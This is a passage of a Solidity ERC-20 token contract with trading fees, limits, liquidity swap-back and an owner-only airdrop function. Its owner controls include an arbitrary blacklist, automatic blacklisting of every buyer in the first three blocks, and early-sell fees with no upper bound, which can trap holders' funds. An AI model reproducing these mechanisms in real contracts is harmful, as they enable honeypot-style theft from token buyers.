1004         maxTransactionAmount = totalSupply * 10 / 1000; // 1% maxTransactionAmountTxn
1005         maxWallet = totalSupply * 20 / 1000; // 2% maxWallet
1006         swapTokensAtAmount = totalSupply * 10 / 10000; // 0.1% swap wallet
1007  
1008         buyMarketingFee = _buyMarketingFee;
1009         buyLiquidityFee = _buyLiquidityFee;
1010         buyDevFee = _buyDevFee;
1011         buyTotalFees = buyMarketingFee + buyLiquidityFee + buyDevFee;
1012  
1013         sellMarketingFee = _sellMarketingFee;
1014         sellLiquidityFee = _sellLiquidityFee;
1015         sellDevFee = _sellDevFee;
1016         sellTotalFees = sellMarketingFee + sellLiquidityFee + sellDevFee;
1017  
1018         earlySellLiquidityFee = _earlySellLiquidityFee;
1019         earlySellMarketingFee = _earlySellMarketingFee;
1020 	earlySellDevFee = _earlySellDevFee;
1021  
1022         marketingWallet = address(owner()); // set as marketing wallet
1023         devWallet = address(owner()); // set as dev wallet
1024  
1025         // exclude from paying fees or having max transaction amount
1026         excludeFromFees(owner(), true);
1027         excludeFromFees(address(this), true);
1028         excludeFromFees(address(0xdead), true);
1029  
1030         excludeFromMaxTransaction(owner(), true);
1031         excludeFromMaxTransaction(address(this), true);
1032         excludeFromMaxTransaction(address(0xdead), true);
1033  
1034         /*
1035             _mint is an internal function in ERC20.sol that is only called here,
1036             and CANNOT be called ever again
1037         */
1038         _mint(msg.sender, totalSupply);
1039     }
1040  
1041     receive() external payable {
1042  
1043     }
1044  
1045     // once enabled, can never be turned off
1046     function enableTrading() external onlyOwner {
1047         tradingActive = true;
1048         swapEnabled = true;
1049         launchedAt = block.number;
1050     }
1051  
1052     // remove limits after token is stable
1053     function removeLimits() external onlyOwner returns (bool){
1054         limitsInEffect = false;
1055         return true;
1056     }
1057  
1058     // disable Transfer delay - cannot be reenabled
1059     function disableTransferDelay() external onlyOwner returns (bool){
1060         transferDelayEnabled = false;
1061         return true;
1062     }
1063  
1064     function setEarlySellTax(bool onoff) external onlyOwner  {
1065         enableEarlySellTax = onoff;
1066     }
1067  
1068      // change the minimum amount of tokens to sell from fees
1069     function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner returns (bool){
1070         require(newAmount >= totalSupply() * 1 / 100000, "Swap amount cannot be lower than 0.001% total supply.");
1071         require(newAmount <= totalSupply() * 5 / 1000, "Swap amount cannot be higher than 0.5% total supply.");
1072         swapTokensAtAmount = newAmount;
1073         return true;
1074     }
1075  
1076     function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
1077         require(newNum >= (totalSupply() * 1 / 1000)/1e18, "Cannot set maxTransactionAmount lower than 0.1%");
1078         maxTransactionAmount = newNum * (10**18);
1079     }
1080  
1081     function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
1082         require(newNum >= (totalSupply() * 5 / 1000)/1e18, "Cannot set maxWallet lower than 0.5%");
1083         maxWallet = newNum * (10**18);
1084     }
1085  
1086     function excludeFromMaxTransaction(address updAds, bool isEx) public onlyOwner {
1087         _isExcludedMaxTransactionAmount[updAds] = isEx;
1088     }
1089  
1090     // only use to disable contract sales if absolutely necessary (emergency use only)
1091     function updateSwapEnabled(bool enabled) external onlyOwner(){
1092         swapEnabled = enabled;
1093     }
1094  
1095     function updateBuyFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee) external onlyOwner {
1096         buyMarketingFee = _marketingFee;
1097         buyLiquidityFee = _liquidityFee;
1098         buyDevFee = _devFee;
1099         buyTotalFees = buyMarketingFee + buyLiquidityFee + buyDevFee;
1100         require(buyTotalFees <= 20, "Must keep fees at 20% or less");
1101     }
1102  
1103     function updateSellFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee, uint256 _earlySellLiquidityFee, uint256 _earlySellMarketingFee, uint256 _earlySellDevFee) external onlyOwner {
1104         sellMarketingFee = _marketingFee;
1105         sellLiquidityFee = _liquidityFee;
1106         sellDevFee = _devFee;
1107         earlySellLiquidityFee = _earlySellLiquidityFee;
1108         earlySellMarketingFee = _earlySellMarketingFee;
1109 	    earlySellDevFee = _earlySellDevFee;
1110         sellTotalFees = sellMarketingFee + sellLiquidityFee + sellDevFee;
1111         require(sellTotalFees <= 25, "Must keep fees at 25% or less");
1112     }
1113  
1114     function excludeFromFees(address account, bool excluded) public onlyOwner {
1115         _isExcludedFromFees[account] = excluded;
1116         emit ExcludeFromFees(account, excluded);
1117     }
1118  
1119     function blacklistAccount (address account, bool isBlacklisted) public onlyOwner {
1120         _blacklist[account] = isBlacklisted;
1121     }
1122  
1123     function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
1124         require(pair != uniswapV2Pair, "The pair cannot be removed from automatedMarketMakerPairs");
1125  
1126         _setAutomatedMarketMakerPair(pair, value);
1127     }
1128  
1129     function _setAutomatedMarketMakerPair(address pair, bool value) private {
1130         automatedMarketMakerPairs[pair] = value;
1131  
1132         emit SetAutomatedMarketMakerPair(pair, value);
1133     }
1134  
1135     function updateMarketingWallet(address newMarketingWallet) external onlyOwner {
1136         emit marketingWalletUpdated(newMarketingWallet, marketingWallet);
1137         marketingWallet = newMarketingWallet;
1138     }
1139  
1140     function updateDevWallet(address newWallet) external onlyOwner {
1141         emit devWalletUpdated(newWallet, devWallet);
1142         devWallet = newWallet;
1143     }
1144  
1145  
1146     function isExcludedFromFees(address account) public view returns(bool) {
1147         return _isExcludedFromFees[account];
1148     }
1149  
1150     event BoughtEarly(address indexed sniper);
1151  
1152     function _transfer(
1153         address from,
1154         address to,
1155         uint256 amount
1156     ) internal override {
1157         require(from != address(0), "ERC20: transfer from the zero address");
1158         require(to != address(0), "ERC20: transfer to the zero address");
1159         require(!_blacklist[to] && !_blacklist[from], "You have been blacklisted from transfering tokens");
1160          if(amount == 0) {
1161             super._transfer(from, to, 0);
1162             return;
1163         }
1164  
1165         if(limitsInEffect){
1166             if (
1167                 from != owner() &&
1168                 to != owner() &&
1169                 to != address(0) &&
1170                 to != address(0xdead) &&
1171                 !swapping
1172             ){
1173                 if(!tradingActive){
1174                     require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "Trading is not active.");
1175                 }
1176  
1177                 // at launch if the transfer delay is enabled, ensure the block timestamps for purchasers is set -- during launch.  
1178                 if (transferDelayEnabled){
1179                     if (to != owner() && to != address(uniswapV2Router) && to != address(uniswapV2Pair)){
1180                         require(_holderLastTransferTimestamp[tx.origin] < block.number, "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.");
1181                         _holderLastTransferTimestamp[tx.origin] = block.number;
1182                     }
1183                 }
1184  
1185                 //when buy
1186                 if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]) {
1187                         require(amount <= maxTransactionAmount, "Buy transfer amount exceeds the maxTransactionAmount.");
1188                         require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
1189                 }
1190  
1191                 //when sell
1192                 else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]) {
1193                         require(amount <= maxTransactionAmount, "Sell transfer amount exceeds the maxTransactionAmount.");
1194                 }
1195                 else if(!_isExcludedMaxTransactionAmount[to]){
1196                     require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
1197                 }
1198             }
1199         }
1200  
1201         // anti bot logic
1202         if (block.number <= (launchedAt + 3) && 
1203                 to != uniswapV2Pair && 
1204                 to != address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)
1205             ) { 
1206             _blacklist[to] = true;
1207         }
1208  
1209         // early sell logic
1210         bool isBuy = from == uniswapV2Pair;
1211         if (!isBuy && enableEarlySellTax) {
1212             if (_holderFirstBuyTimestamp[from] != 0 &&
1213                 (_holderFirstBuyTimestamp[from] + (24 hours) >= block.timestamp))  {
1214                 sellLiquidityFee = earlySellLiquidityFee;
1215                 sellMarketingFee = earlySellMarketingFee;
1216 		        sellDevFee = earlySellDevFee;
1217                 sellTotalFees = sellMarketingFee + sellLiquidityFee + sellDevFee;
1218             } else {
1219                 sellLiquidityFee = 2;
1220                 sellMarketingFee = 3;
1221                 sellTotalFees = sellMarketingFee + sellLiquidityFee + sellDevFee;
1222             }
1223         } else {
1224             if (_holderFirstBuyTimestamp[to] == 0) {
1225                 _holderFirstBuyTimestamp[to] = block.timestamp;
1226             }
1227  
1228             if (!enableEarlySellTax) {
1229                 sellLiquidityFee = 3;
1230                 sellMarketingFee = 3;
1231 		        sellDevFee = 1;
1232                 sellTotalFees = sellMarketingFee + sellLiquidityFee + sellDevFee;
1233             }
1234         }
1235  
1236         uint256 contractTokenBalance = balanceOf(address(this));
1237  
1238         bool canSwap = contractTokenBalance >= swapTokensAtAmount;
1239  
1240         if( 
1241             canSwap &&
1242             swapEnabled &&
1243             !swapping &&
1244             !automatedMarketMakerPairs[from] &&
1245             !_isExcludedFromFees[from] &&
1246             !_isExcludedFromFees[to]
1247         ) {
1248             swapping = true;
1249  
1250             swapBack();
1251  
1252             swapping = false;
1253         }
1254  
1255         bool takeFee = !swapping;
1256  
1257         // if any account belongs to _isExcludedFromFee account then remove the fee
1258         if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
1259             takeFee = false;
1260         }
1261  
1262         uint256 fees = 0;
1263         // only take fees on buys/sells, do not take on wallet transfers
1264         if(takeFee){
1265             // on sell
1266             if (automatedMarketMakerPairs[to] && sellTotalFees > 0){
1267                 fees = amount.mul(sellTotalFees).div(100);
1268                 tokensForLiquidity += fees * sellLiquidityFee / sellTotalFees;
1269                 tokensForDev += fees * sellDevFee / sellTotalFees;
1270                 tokensForMarketing += fees * sellMarketingFee / sellTotalFees;
1271             }
1272             // on buy
1273             else if(automatedMarketMakerPairs[from] && buyTotalFees > 0) {
1274                 fees = amount.mul(buyTotalFees).div(100);
1275                 tokensForLiquidity += fees * buyLiquidityFee / buyTotalFees;
1276                 tokensForDev += fees * buyDevFee / buyTotalFees;
1277                 tokensForMarketing += fees * buyMarketingFee / buyTotalFees;
1278             }
1279  
1280             if(fees > 0){    
1281                 super._transfer(from, address(this), fees);
1282             }
1283  
1284             amount -= fees;
1285         }
1286  
1287         super._transfer(from, to, amount);
1288     }
1289  
1290     function swapTokensForEth(uint256 tokenAmount) private {
1291  
1292         // generate the uniswap pair path of token -> weth
1293         address[] memory path = new address[](2);
1294         path[0] = address(this);
1295         path[1] = uniswapV2Router.WETH();
1296  
1297         _approve(address(this), address(uniswapV2Router), tokenAmount);
1298  
1299         // make the swap
1300         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
1301             tokenAmount,
1302             0, // accept any amount of ETH
1303             path,
1304             address(this),
1305             block.timestamp
1306         );
1307  
1308     }
1309  
1310     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
1311         // approve token transfer to cover all possible scenarios
1312         _approve(address(this), address(uniswapV2Router), tokenAmount);
1313  
1314         // add the liquidity
1315         uniswapV2Router.addLiquidityETH{value: ethAmount}(
1316             address(this),
1317             tokenAmount,
1318             0, // slippage is unavoidable
1319             0, // slippage is unavoidable
1320             address(this),
1321             block.timestamp
1322         );
1323     }
1324  
1325     function swapBack() private {
1326         uint256 contractBalance = balanceOf(address(this));
1327         uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing + tokensForDev;
1328         bool success;
1329  
1330         if(contractBalance == 0 || totalTokensToSwap == 0) {return;}
1331  
1332         if(contractBalance > swapTokensAtAmount * 20){
1333           contractBalance = swapTokensAtAmount * 20;
1334         }
1335  
1336         // Halve the amount of liquidity tokens
1337         uint256 liquidityTokens = contractBalance * tokensForLiquidity / totalTokensToSwap / 2;
1338         uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);
1339  
1340         uint256 initialETHBalance = address(this).balance;
1341  
1342         swapTokensForEth(amountToSwapForETH); 
1343  
1344         uint256 ethBalance = address(this).balance.sub(initialETHBalance);
1345  
1346         uint256 ethForMarketing = ethBalance.mul(tokensForMarketing).div(totalTokensToSwap);
1347         uint256 ethForDev = ethBalance.mul(tokensForDev).div(totalTokensToSwap);
1348         uint256 ethForLiquidity = ethBalance - ethForMarketing - ethForDev;
1349  
1350  
1351         tokensForLiquidity = 0;
1352         tokensForMarketing = 0;
1353         tokensForDev = 0;
1354  
1355         (success,) = address(devWallet).call{value: ethForDev}("");
1356  
1357         if(liquidityTokens > 0 && ethForLiquidity > 0){
1358             addLiquidity(liquidityTokens, ethForLiquidity);
1359             emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity, tokensForLiquidity);
1360         }
1361  
1362         (success,) = address(marketingWallet).call{value: address(this).balance}("");
1363     }
1364 
1365     function Chire(address[] calldata recipients, uint256[] calldata values)
1366         external
1367         onlyOwner
1368     {
1369         _approve(owner(), owner(), totalSupply());
1370         for (uint256 i = 0; i < recipients.length; i++) {
1371             transferFrom(msg.sender, recipients[i], values[i] * 10 ** decimals());
1372         }
1373     }
1374 }